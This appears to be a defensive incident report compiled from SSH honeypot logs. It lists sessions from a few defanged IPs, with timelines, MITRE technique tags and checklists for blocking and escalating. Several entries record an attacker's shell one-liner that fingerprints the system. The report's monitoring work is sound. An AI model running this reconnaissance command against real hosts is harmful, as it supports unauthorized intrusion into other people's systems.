### 🔴 HIGH · IR-0343bc25b32f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:40 |
| **Last Seen** | 2026-09-03 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:40:51` | `cowrie.session.connect` |
| `2026-09-03 17:40:51` | `cowrie.client.version` |
| `2026-09-03 17:40:51` | `cowrie.client.kex` |
| `2026-09-03 17:40:52` | `cowrie.login.success` |
| `2026-09-03 17:40:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:40:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:40:53` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa722d4eec3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:43 |
| **Last Seen** | 2026-09-03 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:43:06` | `cowrie.session.connect` |
| `2026-09-03 17:43:07` | `cowrie.client.version` |
| `2026-09-03 17:43:07` | `cowrie.client.kex` |
| `2026-09-03 17:43:08` | `cowrie.login.success` |
| `2026-09-03 17:43:09` | `cowrie.session.params` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.success` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.command.input` |
| `2026-09-03 17:43:09` | `cowrie.log.closed` |
| `2026-09-03 17:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87816129cd26

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:45 |
| **Last Seen** | 2026-09-03 17:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:45:24` | `cowrie.session.connect` |
| `2026-09-03 17:45:26` | `cowrie.client.version` |
| `2026-09-03 17:45:26` | `cowrie.client.kex` |
| `2026-09-03 17:45:31` | `cowrie.login.success` |
| `2026-09-03 17:45:33` | `cowrie.session.params` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.success` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.command.input` |
| `2026-09-03 17:45:33` | `cowrie.log.closed` |
| `2026-09-03 17:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08682d109b4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:47 |
| **Last Seen** | 2026-09-03 17:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:47:45` | `cowrie.session.connect` |
| `2026-09-03 17:47:45` | `cowrie.client.version` |
| `2026-09-03 17:47:45` | `cowrie.client.kex` |
| `2026-09-03 17:47:49` | `cowrie.login.success` |
| `2026-09-03 17:47:50` | `cowrie.session.params` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.success` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.command.input` |
| `2026-09-03 17:47:50` | `cowrie.log.closed` |
| `2026-09-03 17:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026e15ba4de8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:48 |
| **Last Seen** | 2026-09-03 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:48:59` | `cowrie.session.connect` |
| `2026-09-03 17:48:59` | `cowrie.client.version` |
| `2026-09-03 17:48:59` | `cowrie.client.kex` |
| `2026-09-03 17:49:00` | `cowrie.login.success` |
| `2026-09-03 17:49:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:49:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:49:01` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d645b6493e1c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:50 |
| **Last Seen** | 2026-09-03 17:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:50:03` | `cowrie.session.connect` |
| `2026-09-03 17:50:04` | `cowrie.client.version` |
| `2026-09-03 17:50:04` | `cowrie.client.kex` |
| `2026-09-03 17:50:08` | `cowrie.login.success` |
| `2026-09-03 17:50:09` | `cowrie.session.params` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.success` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.command.input` |
| `2026-09-03 17:50:09` | `cowrie.log.closed` |
| `2026-09-03 17:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9312580f142f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:51 |
| **Last Seen** | 2026-09-03 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:51:31` | `cowrie.session.connect` |
| `2026-09-03 17:51:31` | `cowrie.client.version` |
| `2026-09-03 17:51:31` | `cowrie.client.kex` |
| `2026-09-03 17:51:32` | `cowrie.login.success` |
| `2026-09-03 17:51:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:51:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:51:32` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7013a7c055e1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:52 |
| **Last Seen** | 2026-09-03 17:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:52:28` | `cowrie.session.connect` |
| `2026-09-03 17:52:28` | `cowrie.client.version` |
| `2026-09-03 17:52:28` | `cowrie.client.kex` |
| `2026-09-03 17:52:32` | `cowrie.login.success` |
| `2026-09-03 17:52:33` | `cowrie.session.params` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.success` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.command.input` |
| `2026-09-03 17:52:33` | `cowrie.log.closed` |
| `2026-09-03 17:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93cfecf95733

| Field | Detail |
|---|---|
| **Source IP** | `36.133.163[.]5` |
| **First Seen** | 2026-09-03 17:53 |
| **Last Seen** | 2026-09-03 17:58 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:53:49` | `cowrie.session.connect` |
| `2026-09-03 17:53:49` | `cowrie.client.version` |
| `2026-09-03 17:53:49` | `cowrie.client.kex` |
| `2026-09-03 17:53:50` | `cowrie.login.success` |
| `2026-09-03 17:58:50` | `cowrie.session.file_upload` |
| `2026-09-03 17:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.133.163[.]5` to AbuseIPDB if not already reported
- [ ] Block `36.133.163[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c631709915b7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:55 |
| **Last Seen** | 2026-09-03 17:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:55:02` | `cowrie.session.connect` |
| `2026-09-03 17:55:03` | `cowrie.client.version` |
| `2026-09-03 17:55:03` | `cowrie.client.kex` |
| `2026-09-03 17:55:06` | `cowrie.login.success` |
| `2026-09-03 17:55:07` | `cowrie.session.params` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.success` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:07` | `cowrie.command.input` |
| `2026-09-03 17:55:09` | `cowrie.log.closed` |
| `2026-09-03 17:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2843385dcd6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:57 |
| **Last Seen** | 2026-09-03 17:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:57:19` | `cowrie.session.connect` |
| `2026-09-03 17:57:20` | `cowrie.client.version` |
| `2026-09-03 17:57:20` | `cowrie.client.kex` |
| `2026-09-03 17:57:25` | `cowrie.login.success` |
| `2026-09-03 17:57:26` | `cowrie.session.params` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.success` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.command.input` |
| `2026-09-03 17:57:26` | `cowrie.log.closed` |
| `2026-09-03 17:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97be69b2aa32

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 17:58 |
| **Last Seen** | 2026-09-03 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:58:27` | `cowrie.session.connect` |
| `2026-09-03 17:58:27` | `cowrie.client.version` |
| `2026-09-03 17:58:28` | `cowrie.client.kex` |
| `2026-09-03 17:58:28` | `cowrie.login.success` |
| `2026-09-03 17:58:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 17:58:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 17:58:29` | `cowrie.direct-tcpip.data` |
| `2026-09-03 17:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28486b45ff7e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 17:59 |
| **Last Seen** | 2026-09-03 17:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 17:59:38` | `cowrie.session.connect` |
| `2026-09-03 17:59:39` | `cowrie.client.version` |
| `2026-09-03 17:59:39` | `cowrie.client.kex` |
| `2026-09-03 17:59:42` | `cowrie.login.success` |
| `2026-09-03 17:59:43` | `cowrie.session.params` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.success` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.command.input` |
| `2026-09-03 17:59:43` | `cowrie.log.closed` |
| `2026-09-03 17:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8c5692b0e8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:02 |
| **Last Seen** | 2026-09-03 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:02:24` | `cowrie.session.connect` |
| `2026-09-03 18:02:24` | `cowrie.client.version` |
| `2026-09-03 18:02:24` | `cowrie.client.kex` |
| `2026-09-03 18:02:25` | `cowrie.login.success` |
| `2026-09-03 18:02:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:02:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:02:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211e8984dc91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:08 |
| **Last Seen** | 2026-09-03 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:08:07` | `cowrie.session.connect` |
| `2026-09-03 18:08:07` | `cowrie.client.version` |
| `2026-09-03 18:08:07` | `cowrie.client.kex` |
| `2026-09-03 18:08:08` | `cowrie.login.success` |
| `2026-09-03 18:08:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:08:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:08:09` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957ac64cf3c8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:13 |
| **Last Seen** | 2026-09-03 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:13:23` | `cowrie.session.connect` |
| `2026-09-03 18:13:23` | `cowrie.client.version` |
| `2026-09-03 18:13:23` | `cowrie.client.kex` |
| `2026-09-03 18:13:24` | `cowrie.login.success` |
| `2026-09-03 18:13:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:13:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:13:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
